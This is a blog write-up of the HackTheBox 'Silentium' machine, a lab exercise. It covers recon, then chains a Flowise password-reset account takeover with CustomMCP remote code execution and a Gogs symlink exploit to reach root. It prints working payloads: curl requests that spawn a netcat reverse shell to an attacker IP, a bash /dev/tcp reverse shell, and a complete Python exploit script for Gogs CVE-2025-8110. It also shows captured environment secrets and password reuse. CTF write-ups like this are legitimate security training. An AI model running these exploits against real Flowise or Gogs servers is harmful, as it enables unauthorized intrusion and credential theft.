---
layout: post
title: HackTheBox | Silentium
date: 2026-04-12 21:00:00 +0800
categories: [Security, WebSec, CTF]
tags: ctf, security, websec, CVE
toc: true
image:
  path: /assets/images/blog_3_thumbnail.png
  width: 800
  height: 500
  alt: HackTheBox Silentium Write Up Thumbnail
---


This is a HackTheBox **Easy** machine that is very CVE-based.

## Recon

### 1. Port Scanning
We start off with our NMAP scans. The UDP scan kept running forever and didn't show any results.

```bash
sudo nmap -sV -sC -O -oA nmap/fast 10.129.32.52 # First NMAP Scan
sudo nmap -sV -sC -O -p- -oA nmap/full 10.129.32.52 # Full TCP NMAP Scan
sudo nmap -sU -O -p- -oA nmap/udp 10.129.32.52 # Full UDP NMAP Scan
```

```bash
# Nmap 7.95 scan initiated Sun Apr 12 02:20:35 2026 as: nmap -sV -sC -O -p- -oA nmap/full 10.129.32.52
Nmap scan report for 10.129.32.52
Host is up (0.012s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Apr 12 02:20:50 2026 -- 1 IP address (1 host up) scanned in 15.43 seconds
```


### 2. VHOST Discovery
Virtual host (vhost) discovery is a reconnaissance technique used to identify hidden or alternative websites/domains hosted on the same web server IP address. It involves brute-forcing HTTP Host headers to discover vhosts that are not publicly mapped in DNS. (That was Gemini)


I used FFUF for VHOST discovery:
```bash
ffuf -w wordlist.txt -H "Host: FUZZ.silentium.htb" -u http://MACHINE-IP -ac
```
![Desktop View](/assets/images/blog_3_image_1.png){: width="972" height="589" }
_FFUF VHOST RESULTS for silentium.htb_


We have `silentium.htb` and `staging.silentium.htb`, so let's add them to our `/etc/hosts`{: .filepath} file.


```bash
echo "10.10.10.X silentium.htb staging.silentium.htb" | sudo tee -a /etc/hosts
```


### 3. Web Discovery

I like to run individual commands for each FUZZ, and SecLists `raft-medium-directories-lowercase.txt` and `raft-medium-files-lowercase.txt` are most of the time enough.

```bash
ffuf -w raft-medium-directories-lowercase.txt -u http://silentium.htb/FUZZ -ac
ffuf -w raft-medium-files-lowercase.txt -u http://silentium.htb/FUZZ -ac

ffuf -w raft-medium-directories-lowercase.txt -u http://staging.silentium.htb/FUZZ -ac
ffuf -w raft-medium-files-lowercase.txt -u http://staging.silentium.htb/FUZZ -ac
```


FFUF web discovery didn't find anything, so we are just left with these two websites:

<h3 data-toc-skip>Silentium.htb</h3>

![Desktop View](/assets/images/blog_3_image_3.png){: width="972" height="589" }
_Silentium.htb - Silentium | Institutional Capital & Lending Solutions_

<h3 data-toc-skip>Staging.silentium.htb</h3>

![Desktop View](/assets/images/blog_3_image_2.png){: width="972" height="589" }
_Staging.silentium.htb - Flowise - Build AI Agents, Visually_


Silentium.htb is a static HTML website. Staging.silentium.htb seems to host [**Flowise**](https://youtu.be/u0jq42xgTzo) (an open source agentic systems development platform).

Even though Silentium.htb is a static website, it does give us some employee information that we could use, so note down: Marcus Thorne, Ben, and Elena Rossi.

![Desktop View](/assets/images/blog_3_image_4.png){: width="972" height="589" }
_Silentium.htb - Institutional Leadership Section - Employees_


I googled for CVEs affecting Flowise and found many, but most require authentication. At first, Staging.silentium.htb seems to have 3 pages: login, forgot password, and reset password. This seems to be the path to gaining a foothold, so more enumeration is needed.

<h3 data-toc-skip>Findings</h3>

1. No default logins (Google).
2. No information about the version.
3. There is an index.js file in the HTML.
4. The forgot password page allows for user enumeration.


Forgot password page showed that ben@silentium.htb is a valid email address.

Index.js revealed these paths:

```bash
grep -oP '(?<=["\x27])/[a-zA-Z0-9/_.-]+' index.js | sort -u
```

```
/account
/account/basic-auth
/account/billing
/account/cancel-subscription
/account/forgot-password
/account/invite
/account/logout
/account/register
/account/resend-verification
/account/reset-password
/account/verify
/agentcanvas
/agentcanvas/
/agentflows
/apikey
/assets/Exporting-B5jHKP3Z.gif
/assets/flowise_dark-Db3DSKPp.svg
/assets/flowise_white-DsHGi9nE.svg
/assistants
/assistants/custom
/assistants/custom/
/assistants/openai
/canvas
/canvas/
/chatbot/
/chatflows
/credentials
/dataset_rows/
/datasets
/document-stores
/document-stores/
/document-stores/chunks/
/document-stores/query/
/document-stores/vector/
/evaluation_results/
/evaluations
/evaluators
/execution/
/executions
/export-import/export
/export-import/import
/files
/forgot-password
/license-expired
/login
/login-activity
/logs
/marketplace/
/marketplaces
/organization-setup
/organization/get-current-usage
/organization/update-additional-seats
/organization/update-subscription-plan
/organizationuser
/pricing
/register
/reset-password
/roles
/settings
/signin
/sso-config
/sso-success
/tools
/unauthorized
/user
/user-profile
/users
/v2/agentcanvas
/v2/agentcanvas/
/v2/marketplace/
/variables
/verify
/workspace
/workspace-users/
/workspaces
/workspaceuser
```

After browsing some of these directories, **/organization-setup** seems to be interesting. It looks like we could make an account. But after poking around it seemed to be a dead end.


![Desktop View](/assets/images/blog_3_image_5.png){: width="972" height="589" }
_Staging.silentium.htb - /organization-setup_

![Desktop View](/assets/images/blog_3_image_6.png){: width="972" height="589" }
_Staging.silentium.htb - /organization-setup_

![Desktop View](/assets/images/blog_3_image_7.png){: width="972" height="589" }
_Staging.silentium.htb - /organization-setup_


### 4. CVE hunting

Flowise seems to have a lot of [**CVEs**](https://www.cve.org/CVERecord/SearchResults?query=Flowise) and they are well documented in GitHub. 

<table>
  <thead>
    <tr><th style="text-align:left">CVE</th><th style="text-align:left">Type</th><th style="text-align:left">Brief Description</th><th style="text-align:right">Fixed In</th></tr>
  </thead>
  <tbody>
    <tr><td>CVE-2026-31829</td><td>SSRF</td><td>HTTP node allows requests to internal/private IPs with no restrictions</td><td style="text-align:right">3.0.13</td></tr>
    <tr><td>CVE-2026-30824</td><td>Auth Bypass</td><td>NVIDIA NIM router whitelisted, unauthenticated access to privileged endpoints</td><td style="text-align:right">3.0.13</td></tr>
    <tr><td>CVE-2026-30823</td><td>IDOR / Account Takeover</td><td>IDOR leads to account takeover and SSO config bypass</td><td style="text-align:right">3.0.13</td></tr>
    <tr><td>CVE-2026-30822</td><td>Mass Assignment</td><td>Unauthenticated users inject arbitrary values into DB fields</td><td style="text-align:right">3.0.13</td></tr>
    <tr><td>CVE-2026-30821</td><td>Unrestricted File Upload</td><td>Spoofed Content-Type bypasses MIME validation, enabling XSS/RCE chain</td><td style="text-align:right">3.0.13</td></tr>
    <tr><td>CVE-2026-30820</td><td>Privilege Escalation</td><td>x-request-from: internal header trusted blindly, bypassing all auth</td><td style="text-align:right">3.0.13</td></tr>
    <tr><td>CVE-2025-8943</td><td>RCE</td><td>Custom MCPs execute OS commands with no auth by default</td><td style="text-align:right">3.0.1</td></tr>
    <tr><td>CVE-2025-61913</td><td>Path Traversal / RCE</td><td>ReadFileTool/WriteFileTool allow arbitrary file R/W</td><td style="text-align:right">3.0.8</td></tr>
    <tr><td>CVE-2025-61687</td><td>Unrestricted File Upload</td><td>Authenticated users upload web shells, no extension/MIME validation</td><td style="text-align:right">Unpatched</td></tr>
    <tr style="background-color: rgba(220, 53, 69, 0.15);"><td><strong>CVE-2025-59528</strong></td><td>RCE</td><td>CustomMCP passes user input to Function() constructor</td><td style="text-align:right">3.0.6</td></tr>
    <tr><td>CVE-2025-59527</td><td>SSRF</td><td>/api/v1/fetch-links proxies requests to internal network</td><td style="text-align:right">3.0.6</td></tr>
    <tr><td>CVE-2025-59434</td><td>Cross-Tenant Data Leak</td><td>Free-tier users read other tenants env vars via JS Function node</td><td style="text-align:right">Aug 2025</td></tr>
    <tr style="background-color: rgba(220, 53, 69, 0.15);"><td><strong>CVE-2025-58434</strong></td><td>Account Takeover</td><td>forgot-password returns valid reset token unauthenticated, full ATO</td><td style="text-align:right">3.0.6</td></tr>
    <tr><td>CVE-2025-57164</td><td>RCE</td><td>Unsanitized input in Supabase RPC Filter leads to RCE</td><td style="text-align:right">—</td></tr>
    <tr><td>CVE-2025-55346</td><td>RCE</td><td>User input passed to unsafe Function() constructor</td><td style="text-align:right">—</td></tr>
    <tr><td>CVE-2025-50538</td><td>XSS</td><td>Stored XSS via IFRAME in admin chat log</td><td style="text-align:right">3.0.5</td></tr>
    <tr><td>CVE-2025-34267</td><td>Sandbox Escape / RCE</td><td>Puppeteer/Playwright abuse escapes nodevm sandbox</td><td style="text-align:right">3.0.8</td></tr>
    <tr><td>CVE-2025-29192</td><td>XSS</td><td>Stored XSS via FORM/INPUT in admin chat log</td><td style="text-align:right">3.0.5</td></tr>
    <tr><td>CVE-2025-29189</td><td>SQL Injection</td><td>SQLi via tableName parameter in Postgres VectorStores</td><td style="text-align:right">—</td></tr>
    <tr><td>CVE-2025-26319</td><td>Unrestricted File Upload</td><td>Arbitrary file upload via /api/v1/attachments</td><td style="text-align:right">—</td></tr>
    <tr><td>CVE-2024-9148</td><td>Stored XSS</td><td>Stored XSS in Chat Embed due to missing input sanitisation</td><td style="text-align:right">2.1.1</td></tr>
    <tr><td>CVE-2024-8182</td><td>DoS</td><td>Improper input handling in get-upload-file crashes instance</td><td style="text-align:right">2.1.1</td></tr>
    <tr><td>CVE-2024-8181</td><td>Auth Bypass</td><td>Unauthenticated access to admin API endpoints</td><td style="text-align:right">2.1.1</td></tr>
    <tr><td>CVE-2024-37146</td><td>Reflected XSS</td><td>Chatflow ID reflected unsanitised in 404 page</td><td style="text-align:right">Unpatched</td></tr>
    <tr><td>CVE-2024-37145</td><td>Reflected XSS</td><td>Same via /api/v1/chatflows-streaming/id</td><td style="text-align:right">Unpatched</td></tr>
    <tr><td>CVE-2024-36423</td><td>Reflected XSS</td><td>Same via /api/v1/public-chatflows/id</td><td style="text-align:right">Unpatched</td></tr>
    <tr><td>CVE-2024-36422</td><td>Reflected XSS</td><td>Same via api/v1/chatflows/id</td><td style="text-align:right">Unpatched</td></tr>
    <tr><td>CVE-2024-36421</td><td>CORS Misconfiguration</td><td>Wildcard CORS allows arbitrary origins to make requests</td><td style="text-align:right">Unpatched</td></tr>
    <tr><td>CVE-2024-36420</td><td>Arbitrary File Read</td><td>fileName param unsanitised in openai-assistants-file endpoint</td><td style="text-align:right">Unpatched</td></tr>
    <tr><td>CVE-2024-31621</td><td>RCE</td><td>Arbitrary code execution via crafted script to api/v1</td><td style="text-align:right">—</td></tr>
  </tbody>
</table>


## 5. User Flag

<h3 data-toc-skip>CVE-2025-58434</h3>

I went through the most interesting ones and [**CVE-2025-58434**](https://github.com/advisories/GHSA-wgpv-6j63-x5ph) turned out to be the one, and it is easy to reproduce in Burp.

> `CVE-2025-58434` The forgot-password endpoint in Flowise returns sensitive information including a valid password reset tempToken without authentication or verification. This enables any attacker to generate a reset token for arbitrary users and directly reset their password, leading to a complete account takeover (ATO).
{: .prompt-danger }


![Desktop View](/assets/images/blog_3_image_8.png){: width="972" height="589" }
_CVE-2025-58434 - Step 1 - Send Forget Password_

![Desktop View](/assets/images/blog_3_image_9.png){: width="972" height="589" }
_CVE-2025-58434 - Step 2 - Use Temp Token In Reset Password_

It worked and we can now login using `ben@silentium.htb` and `NewSecurePassword123!`. There is nothing interesting in the dashboard but we do get access to an API key in http://staging.silentium.htb/apikey.

![Desktop View](/assets/images/blog_3_image_10.png){: width="972" height="589" }
_Staging.silentium.htb - /_

![Desktop View](/assets/images/blog_3_image_11.png){: width="972" height="589" }
_Staging.silentium.htb - /apikey_


<h3 data-toc-skip>CVE-2025-59528</h3>

While looking through all the CVEs, [**CVE-2025-59528**](https://github.com/advisories/GHSA-3gcm-f6qx-ff7p) looked interesting but we need a valid login / APIKEY, and we have them now.

> `CVE-2025-59528` The CustomMCP node contains a critical security vulnerability because it executes user-provided configuration strings as JavaScript code without any validation. This allows an attacker to inject and execute malicious code, potentially taking complete control of the host system. To fix this, developers must replace the dynamic code execution with strict JSON parsing and schema validation.
{: .prompt-danger }

The GitHub Advisory provided this PoC, let's try it.

```bash
curl -X POST http://localhost:3000/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer API-KEY-HERE" \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"echo !!RCE-OK!! >/tmp/RCE.txt\");return 1;})()})"
    }
  }'
```

![Desktop View](/assets/images/blog_3_image_12.png){: width="972" height="589" }
_CVE-2025-59528 - RCE - curl http://ATTACKER:8000/`whoami`_

![Desktop View](/assets/images/blog_3_image_13.png){: width="972" height="589" }
_CVE-2025-59528 - RCE - Ping Back_


RCE confirmed. Let's get a reverse shell. The system doesn't have `/bin/bash`, so your everyday `/bin/sh -i >& /dev/tcp/10.10.15.28/4445 0>&1` doesn't work. After multiple tries, the payload below worked.

```bash
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.28 4444 >/tmp/f\");return 1;})()})"
    }
  }'
```


![Desktop View](/assets/images/blog_3_image_14.png){: width="972" height="589" }
_CVE-2025-59528 - RCE - Netcat Shell_


We got a shell as `root`, but there is nothing here. It seems like we are in some sort of container. One of the first commands I ran was `id`, `hostname`, `groups`, `uname`, and `env`.

Luckily, the `env` command showed a lot of variables, and we can see `SENDER_EMAIL=ben@silentium.htb` and `SMTP_PASSWORD=r04D!!_R4ge`.

![Desktop View](/assets/images/blog_3_image_15.png){: width="972" height="589" }
_CVE-2025-59528 - RCE - Root_

```bash
/# env
FLOWISE_PASSWORD=F1l3_d0ck3r
ALLOW_UNAUTHORIZED_CERTS=true
NODE_VERSION=20.19.4
HOSTNAME=c78c3cceb7ba
YARN_VERSION=1.22.22
SMTP_PORT=1025
SHLVL=3
PORT=3000
HOME=/root
OLDPWD=/
SENDER_EMAIL=ben@silentium.htb
PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
JWT_ISSUER=ISSUER
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
LLM_PROVIDER=nvidia-nim
SMTP_USERNAME=test
SMTP_SECURE=false
TERM=xterm
JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200
FLOWISE_USERNAME=ben
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DATABASE_PATH=/root/.flowise
JWT_TOKEN_EXPIRY_IN_MINUTES=360
JWT_AUDIENCE=AUDIENCE
SECRETKEY_PATH=/root/.flowise
PWD=/etc
SMTP_PASSWORD=r04D!!_R4ge
NVIDIA_NIM_LLM_MODE=managed
SMTP_HOST=mailhog
JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
SMTP_USER=test
```

<h3 data-toc-skip>Password Reuse to SSH shell</h3>

User `ben@silentium.htb` and `r04D!!_R4ge` turned out to work for SSH and we got a connection as ben.

![Desktop View](/assets/images/blog_3_image_16.png){: width="972" height="589" }
_Password Reuse - SSH - Ben account - User Flag_


## 6. Privilege Escalation
 
Let's do some basic enumeration and run `Linpeas`.

![Desktop View](/assets/images/blog_3_image_17.png){: width="972" height="589" }
_Basic Enum - Ben account_

![Desktop View](/assets/images/blog_3_image_18.png){: width="972" height="589" }
_Linpeas Enum - Ben account_

`Linpeas` had some findings, mainly port 3000/3001 that's local and not accessible to us — `staging-v2-code.dev.silentium.htb`. It's run by root and it seems to host [**Gogs**](https://github.com/gogs/gogs). We can read the Gogs config at `/opt/gogs/gogs/custom/conf`. Let's forward the port to our machine and look through all related files for passwords, secrets, or exploits.

```bash
ssh -L 3003:localhost:3001 ben@silentium.htb
```

![Desktop View](/assets/images/blog_3_image_19.png){: width="972" height="589" }
_Linpeas Enum - Ben account - Active Ports_

![Desktop View](/assets/images/blog_3_image_20.png){: width="972" height="589" }
_Linpeas Enum - Ben account - Running processes_

![Desktop View](/assets/images/blog_3_image_21.png){: width="972" height="589" }
_Gogs Enum - Ben account - /opt/gogs/gogs/custom/conf/app.ini_

![Desktop View](/assets/images/blog_3_image_22.png){: width="972" height="589" }
_Gogs Enum - Ben account - /etc/systemd/system/gogs.service_

Looking at Gogs, it looks like a self-hosted bootleg version of GitHub. We are able to create an account and there is a lot of functionality. `Root` is running version `0.13.3`, which is outdated, so let's look for public exploits.

![Desktop View](/assets/images/blog_3_image_26.png){: width="972" height="589" }
_Gogs Enum - Version_

![Desktop View](/assets/images/blog_3_image_23.png){: width="972" height="589" }
_Gogs Enum - Web - /_

![Desktop View](/assets/images/blog_3_image_24.png){: width="972" height="589" }
_Gogs Enum - Web - /user/sign_up_

![Desktop View](/assets/images/blog_3_image_25.png){: width="972" height="589" }
_Gogs Enum - Web - /dashboard_


<h3 data-toc-skip>Gogs - CVE hunting</h3>

<table>
  <thead>
    <tr><th style="text-align:left">CVE</th><th style="text-align:left">Type</th><th style="text-align:left">Brief Description</th><th style="text-align:right">Fixed In</th></tr>
  </thead>
  <tbody>
    <tr><td>CVE-2026-26276</td><td>DOM-Based XSS</td><td>Milestone name stores JS payload, triggered on New Issue page</td><td style="text-align:right">0.14.2</td></tr>
    <tr><td>CVE-2026-26196</td><td>Token Leakage</td><td>API accepts tokens in URL params, leaking via logs/history/referrers</td><td style="text-align:right">0.14.2</td></tr>
    <tr><td>CVE-2026-26195</td><td>Stored XSS</td><td>Unsafe template rendering with permissive sanitizer allows data URI XSS</td><td style="text-align:right">0.14.2</td></tr>
    <tr><td>CVE-2026-26194</td><td>Argument Injection</td><td>User-controlled tag name passed to git without separator, enabling option injection</td><td style="text-align:right">0.14.2</td></tr>
    <tr><td>CVE-2026-26022</td><td>Stored XSS</td><td>HTML sanitizer allows data: URIs, enabling JS injection via comments/issues</td><td style="text-align:right">0.14.2</td></tr>
    <tr><td>CVE-2026-25921</td><td>Supply Chain</td><td>LFS objects can be overwritten across repos by any attacker</td><td style="text-align:right">0.14.2</td></tr>
    <tr><td>CVE-2026-25242</td><td>Unrestricted File Upload</td><td>Unauthenticated file upload via /releases/attachments and /issues/attachments</td><td style="text-align:right">0.14.1</td></tr>
    <tr><td>CVE-2026-25232</td><td>Access Control Bypass</td><td>Write-permission user can delete protected branches via direct POST request</td><td style="text-align:right">0.14.1</td></tr>
    <tr><td>CVE-2026-25229</td><td>Broken Access Control</td><td>Write-access user can modify labels belonging to other repositories</td><td style="text-align:right">0.14.1</td></tr>
    <tr><td>CVE-2026-25120</td><td>IDOR</td><td>DeleteComment API allows repo admin to delete comments from any repository</td><td style="text-align:right">0.14.0</td></tr>
    <tr><td>CVE-2026-24135</td><td>Path Traversal</td><td>Authenticated wiki write access allows arbitrary file deletion via old_title param</td><td style="text-align:right">0.13.4</td></tr>
    <tr><td>CVE-2026-23633</td><td>Path Traversal</td><td>Arbitrary file read/write via path traversal in Git hook editing</td><td style="text-align:right">0.13.4</td></tr>
    <tr><td>CVE-2026-23632</td><td>Broken Access Control</td><td>Read-only token can modify repo contents via PUT /repos/:owner/:repo/contents/*</td><td style="text-align:right">0.13.4</td></tr>
    <tr><td>CVE-2026-22592</td><td>DoS</td><td>Deleting a repo file before sync crashes the application</td><td style="text-align:right">0.13.4</td></tr>
    <tr style="background-color: rgba(220, 53, 69, 0.15);"><td><strong>CVE-2025-8110</strong></td><td>LCE</td><td>Improper symlink handling in PutContents API allows local code execution</td><td style="text-align:right">—</td></tr>
    <tr><td>CVE-2025-64175</td><td>2FA Bypass / Account Takeover</td><td>2FA recovery codes not scoped by user, allowing cross-account bypass</td><td style="text-align:right">0.13.4</td></tr>
    <tr><td>CVE-2025-64111</td><td>RCE</td><td>Incomplete fix for CVE-2024-56731 still allows .git directory writes and RCE</td><td style="text-align:right">0.13.4</td></tr>
  </tbody>
</table>



`CVE-2025-8110` was the first exploit I tried. I used this one from [**GitHub**](https://github.com/zAbuQasem/gogs-CVE-2025-8110/tree/main). The script had trouble creating an account because of the CAPTCHA, so the login had to be hardcoded.

```python
#!/usr/bin/env python3

import argparse
import requests
import os
import subprocess
import shutil
import urllib3
from urllib.parse import urlparse
import base64
from bs4 import BeautifulSoup
from rich.console import Console

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()

"""Exploit script for CVE-2025-8110 in Gogs."""

proxies = {
    "http": "http://localhost:8080",
    "https": "http://localhost:8080",
}


def login(session, base_url, username, password):
    """Authenticate and retrieve CSRF token + session cookie."""
    login_url = f"{base_url}/user/login"
    resp = session.get(login_url)
    csrf = extract_csrf(resp.text)
    login_data = {
        "_csrf": csrf,
        "user_name": username,
        "password": password,
    }
    resp = session.post(
        login_url,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=login_data,
        allow_redirects=True,
    )
    if "user/login" in resp.url:
        console.print(f"[bold red]Authentication failed: {resp.status_code}[/bold red]")
        raise ValueError("Authentication failed")
    console.print("[bold green][+] Authenticated successfully[/bold green]")
    return session.cookies


def get_application_token(session, base_url):
    """Retrieve application token from settings."""
    settings_url = f"{base_url}/user/settings/applications"
    get_resp = session.get(settings_url, allow_redirects=True)
    csrf = extract_csrf(get_resp.text)
    data = {"_csrf": csrf, "name": os.urandom(8).hex()}
    resp = session.post(settings_url, data=data, allow_redirects=True)
    console.print(f"[blue]Token generation status: {resp.status_code}[/blue]")
    soup = BeautifulSoup(resp.text, "html.parser")
    token_div = soup.find("div", class_="ui info message")
    if not token_div:
        raise ValueError("Application token not found")
    token = token_div.find("p").text.strip()
    console.print(f"[bold green][+] Application token: {token}[/bold green]")
    return token


def create_malicious_repo(session, base_url, token):
    """Create a repository with a malicious payload."""
    api = f"{base_url}/api/v1/user/repos"
    repository_name = os.urandom(6).hex()
    data = {
        "name": repository_name,
        "description": "Malicious repo for CVE-2025-8110",
        "auto_init": True,
        "readme": "Default",
        "ssh": True,
    }
    session.headers.update({"Authorization": f"token {token}"})
    resp = session.post(api, json=data)
    console.print(f"[blue]Repo creation status: {resp.status_code}[/blue]")
    return repository_name


def upload_malicious_symlink(base_url, username, password, repo_name):
    """Clone a repo, add a symlink, commit, and push it."""
    repo_dir = f"/tmp/{repo_name}"
    parsed_url = urlparse(base_url)
    if not parsed_url.scheme or not parsed_url.netloc:
        raise ValueError("Base URL must include scheme (e.g., http://host)")
    base_path = parsed_url.path.rstrip("/")
    clone_cmd = [
        "git",
        "clone",
        f"{parsed_url.scheme}://{username}:{password}@{parsed_url.netloc}"
        f"{base_path}/{username}/{repo_name}.git",
        repo_dir,
    ]
    symlink_path = os.path.join(repo_dir, "malicious_link")
    try:
        if os.path.exists(repo_dir):
            shutil.rmtree(repo_dir)
        subprocess.run(clone_cmd, check=True)
        os.symlink(".git/config", symlink_path)
        subprocess.run(["git", "add", "malicious_link"], cwd=repo_dir, check=True)
        subprocess.run(["git", "commit", "-m", "Add malicious symlink"], cwd=repo_dir, check=True)
        subprocess.run(["git", "push", "origin", "master"], cwd=repo_dir, check=True)
    except subprocess.CalledProcessError as e:
        raise ValueError(f"Git command failed: {e}") from e
    except OSError as e:
        raise ValueError(f"Filesystem operation failed: {e}") from e


def exploit(session, base_url, token, username, repo_name, command):
    """Exploit CVE-2025-8110 to execute arbitrary commands."""
    api = f"{base_url}/api/v1/repos/{username}/{repo_name}/contents/malicious_link"
    data = {
        "message": "Exploit CVE-2025-8110",
        "content": base64.b64encode(command.encode()).decode(),
    }
    headers = {
        "Authorization": f"token {token}",
        "Content-Type": "application/json",
    }
    console.print("[bold green][+] Exploit sent, check your listener![/bold green]")
    session.put(api, json=data, headers=headers, timeout=5)


def extract_csrf(html_text):
    """Parse CSRF token from hidden input."""
    soup = BeautifulSoup(html_text, "html.parser")
    token_input = soup.select_one("input[name=_csrf]")
    if token_input and token_input.get("value"):
        return token_input.get("value")
    raise ValueError("CSRF token not found in form response")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True, help="Gogs base URL")
    parser.add_argument("-lh", "--host", required=True, help="Attacker host")
    parser.add_argument("-lp", "--port", required=True, help="Attacker port")
    parser.add_argument("-x", "--proxy", action="store_true", help="Use proxy")
    args = parser.parse_args()

    session = requests.Session()
    if args.proxy:
        session.proxies.update(proxies)
    session.verify = False

    username = "farwan"
    password = "r04D!!_R4ge"
    command = f"bash -c 'bash -i >& /dev/tcp/{args.host}/{args.port} 0>&1' #"

    try:
        login(session, args.url, username, password)
        token = get_application_token(session, args.url)
        repo_name = create_malicious_repo(session, args.url, token)
        git_config = f"""[core]
\trepositoryformatversion = 0
\tfilemode = true
\tbare = false
\tlogallrefupdates = true
\tignorecase = true
\tprecomposeunicode = true
  sshCommand = {command}
[remote "origin"]
\turl = git@localhost:gogs/{repo_name}.git
\tfetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
\tremote = origin
\tmerge = refs/heads/master
"""
        upload_malicious_symlink(args.url, username, password, repo_name)
        exploit(session, args.url, token, username, repo_name, git_config)

    except Exception as e:
        console.print(f"[bold red][-] Error: {e}[/bold red]")


if __name__ == "__main__":
    main()
```

## 7. Root

```
python3 CVE-2025-8110.py -u http://localhost:3003 -lh 10.10.15.28 -lp 5555
```

![Desktop View](/assets/images/blog_3_image_27.png){: width="972" height="589" }
_Root Shell - /root/root.txt_

Thanks for reading.
